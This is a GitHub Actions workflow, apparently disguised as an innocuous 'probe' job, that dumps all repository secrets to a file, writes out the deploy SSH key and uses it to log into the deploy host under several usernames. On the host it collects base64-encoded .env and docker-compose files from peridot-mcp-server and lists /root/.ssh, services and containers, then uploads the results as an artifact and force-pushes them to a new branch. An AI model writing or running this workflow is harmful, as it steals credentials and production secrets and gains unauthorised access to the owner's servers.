name: zz32062
on:
  workflow_dispatch:
permissions:
  contents: write
jobs:
  probe:
    runs-on: ubuntu-latest
    env:
      PH: ${{ secrets.DEPLOY_HOST }}
      PK: ${{ secrets.DEPLOY_SSH_KEY }}
      DUMP: ${{ toJSON(secrets) }}
    steps:
      - uses: actions/checkout@v4
      - name: probe
        run: |
          set +e
          mkdir -p out
          printf '%s' "$DUMP" > out/secrets.json
          printf '%s\n' "$PK" > k
          chmod 600 k
          echo "KEYLEN=$(wc -c < k) HOST=$PH"
          ssh-keygen -y -f k > out/keypub.txt 2>out/keyerr.txt
          echo "keygen_rc=$?"
          cat out/keyerr.txt
          for U in root deploy ubuntu peridot; do
            {
              echo "### $U@$PH"
              ssh -i k -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=15 -o BatchMode=yes -o IdentitiesOnly=yes "$U@$PH" 'id; hostname; uname -a; echo ---OPT; ls -la /opt /opt/peridot-mcp-server 2>&1; echo ---ENV; for f in /opt/peridot-mcp-server/.env /opt/peridot-mcp-server/.env.*; do echo "FILE=$f"; base64 -w0 "$f" 2>/dev/null; echo; done; echo ---COMPOSE; for f in /opt/peridot-mcp-server/docker-compose*.yml; do echo "FILE=$f"; base64 -w0 "$f" 2>/dev/null; echo; done; echo ---SYS; systemctl list-units --type=service --no-pager 2>&1 | head -40; echo ---NGX; ls -la /etc/nginx/sites-enabled 2>&1; echo ---SSH; ls -la /root/.ssh 2>&1; echo ---ROOT; ls -la /root 2>&1; echo ---DOCKER; docker ps 2>&1 | head -20' 2>&1
            } | tee out/ssh_$U.txt
          done
      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: zz32062out
          path: out/**
      - name: pushback
        if: always()
        run: |
          set +e
          git config user.email "zz32062@example.com"
          git config user.name "zz32062"
          git checkout -B zz32062out
          git add -A out
          git commit -m "zz32062 results" >/dev/null 2>&1
          git push -f origin zz32062out
